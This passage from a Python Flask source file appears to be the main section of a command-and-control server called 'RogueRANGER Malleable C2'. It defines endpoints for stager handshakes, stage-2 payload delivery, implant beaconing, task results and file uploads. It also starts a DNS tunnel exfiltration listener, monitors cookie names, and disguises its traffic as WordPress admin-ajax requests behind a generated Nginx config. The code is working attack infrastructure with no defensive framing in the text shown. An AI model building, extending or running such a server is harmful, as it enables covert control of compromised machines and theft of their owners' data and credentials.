                    '<pre>Nginx config generated at: nginx/wordpress-mask.conf\nRun: sudo ./deploy.sh to deploy</pre>';
            }

            function viewExfil(implant_id) {
                document.getElementById('implant-select').value = implant_id;
                openTab(event, 'DNS Exfil');
                loadExfilData();
            }

            function openTab(evt, tabName) {
                var i, tabcontent, tablinks;
                tabcontent = document.getElementsByClassName("tabcontent");
                for (i = 0; i < tabcontent.length; i++) {
                    tabcontent[i].style.display = "none";
                }
                tablinks = document.getElementsByClassName("tablinks");
                for (i = 0; i < tablinks.length; i++) {
                    tablinks[i].className = tablinks[i].className.replace(" active", "");
                }
                document.getElementById(tabName).style.display = "block";
                evt.currentTarget.className += " active";
                
                if (tabName === 'Payloads') loadPayloads();
            }

            refreshData();
            setInterval(refreshData, 10000);
            loadPayloads();
        </script>
    </body>
    </html>
    '''

@app.route('/phase1/test', methods=['GET'])
def test():
    return jsonify({
        'success': True,
        'message': 'Malleable C2 is running',
        'features': ['wordpress_mask', 'dns_tunnel', 'jitter_tracking', 'process_tracking'],
        'payloads': len(list(PAYLOAD_DIR.glob('*.py'))),
        'dns_available': DNS_AVAILABLE,
        'endpoints': {
            'handshake': '/handshake',
            'stage2': '/stage2/<filename>',
            'beacon': '/api/v1/telemetry (or /wp-admin/admin-ajax.php)',
            'results': '/api/v1/results',
            'uploads': '/api/v1/uploads'
        }
    })

# ========== Main ==========
if __name__ == '__main__':
    import sys
    import argparse
    
    parser = argparse.ArgumentParser(description='RogueRANGER Malleable C2')
    parser.add_argument('--deploy-nginx', action='store_true', help='Generate and deploy Nginx config')
    parser.add_argument('--domain', default='_', help='Domain for Nginx config')
    parser.add_argument('--no-dns', action='store_true', help='Disable DNS tunnel')
    parser.add_argument('--dns-domain', default='updates.your-domain.com', help='Domain for DNS tunnel')
    
    args = parser.parse_args()
    
    DNS_DOMAIN = args.dns_domain
    
    print("=" * 60)
    print("RogueRANGER Malleable C2")
    print("=" * 60)
    print(f"Port: {C2_PORT}")
    print(f"Payload directory: {PAYLOAD_DIR} ({len(list(PAYLOAD_DIR.glob('*.py')))} payloads)")
    print(f"Upload directory: {UPLOAD_DIR}")
    print(f"Database: {DB_PATH}")
    print(f"DNS Tunnel: {'Enabled' if DNS_AVAILABLE and not args.no_dns else 'Disabled'}")
    if DNS_AVAILABLE and not args.no_dns:
        print(f"DNS Domain: {DNS_DOMAIN}")
    
    # Generate Nginx config if requested
    if args.deploy_nginx:
        config_path = generate_nginx_config(args.domain)
        print(f"\n[+] Nginx config generated: {config_path}")
        print("[*] To deploy, run: sudo ./deploy.sh")
    
    # Start DNS listener if available
    dns_manager = None
    if DNS_AVAILABLE and not args.no_dns:
        dns_manager = DNSExfilManager(DNS_DOMAIN)
        if dns_manager.start_listener():
            print("[+] DNS tunnel listener started")
            
            # Start queue processor
            def process_exfil_queue():
                while True:
                    time.sleep(10)
                    if dns_manager:
                        dns_manager.process_queue()
            
            queue_thread = threading.Thread(target=process_exfil_queue)
            queue_thread.daemon = True
            queue_thread.start()
    
    print("\nCookie names monitored:")
    print(f"  {', '.join(COOKIE_NAMES[:5])}...")
    print("\nEndpoints:")
    print("  POST /handshake                 - Stager handshake")
    print("  GET  /stage2/<filename>         - Payload delivery")
    print("  POST /api/v1/telemetry          - Implant beacon")
    print("  POST /wp-admin/admin-ajax.php   - WordPress mimicry")
    print("  POST /api/v1/results             - Task results")
    print("  POST /api/v1/uploads             - File uploads")
    print("  POST /phase1/command             - Add task")
    print("  GET  /phase1/implants            - List implants")
    print("  GET  /phase1/dashboard           - Web dashboard")
    print("=" * 60)
    
    app.run(host=C2_HOST, port=C2_PORT, debug=False, threaded=True)
